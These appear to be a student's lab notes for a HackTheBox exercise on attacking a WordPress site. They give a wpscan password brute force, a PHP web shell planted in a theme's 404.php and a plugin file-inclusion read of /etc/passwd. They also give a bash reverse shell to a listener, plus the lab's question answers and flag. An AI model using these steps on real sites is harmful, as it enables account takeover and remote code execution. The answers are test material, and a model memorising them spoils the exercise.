@@ -1,1 +1,77 @@
 
+Login Bruteforce
+WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it’s faster.
+
+SYNTAX: MJBUCKNER@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+
+[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
+[+] Started: Wed Aug 25 11:56:23 2021
+
+<SNIP>
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - john / firebird1                                                                                           
+Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: john, Password: firebird1
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Wed Aug 25 11:56:46 2021
+[+] Requests Done: 799
+[+] Cached Requests: 39
+[+] Data Sent: 373.152 KB
+[+] Data Received: 448.799 KB
+[+] Memory used: 221 MB
+
+[+] Elapsed time: 00:00:23
+
+
+Code Execution
+With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the john user, which will redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.
+
+Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.
+
+
+WEB SHELL EXAMPLE: system($_GET[0]);    -> this is in the Twenty Nineteen: 404 Template (404.php)
+
+Hit update -> 
+
+EXAMPLE : MJBUCKNER@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+
+pretty much its telling us to look at all plugins and try to find a vulnerable one. 
+
+
+QUESTION 1 - Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present? - doug 
+1) wpscan --url http://blog.inlanefreight.local --enumerate 
+2) scroll down to the 'Users Identified' section 
+3) we see admin and doug 
+
+Question 2 - Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.
+1) wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url blog.inlanefreight.local
+2) [!] Valid Combinations Found:
+ | Username: doug, Password: jessica1
+
+
+
+Question 3 -  Using the methods shown in this section, find another system user whose login shell is set to /bin/bash. - webadmin 
+1) From the previously attained enumeration output produced by WPScan, students will know that the plugin mail-masta is being utilized by the web application, thus, they need to exploit its vulnerability which allows discovering the underlying OS's environment variables:
+2) curl -s blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "/bin/bash"
+3) output: webadmin:x:1001:1001::/home/webadmin:/bin/bash
+
+
+Question 4 - Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot. - l00k_ma_unAuth_rc3! 
+1) http://blog.inlanefreight.local/wp-login.php 
+2) use creds -> doug:jessica1
+3) theme editor -> twenty nineteen -> 404.php 
+4) exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.252/4444 0>&1'");
+5) nc -nlvp 4444
+6) update file 
+7) now go to -> http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php -> this will initate the shell 
+8) enumerate until you find /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
+9) cat /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt -> l00k_ma_unAuth_rc3!
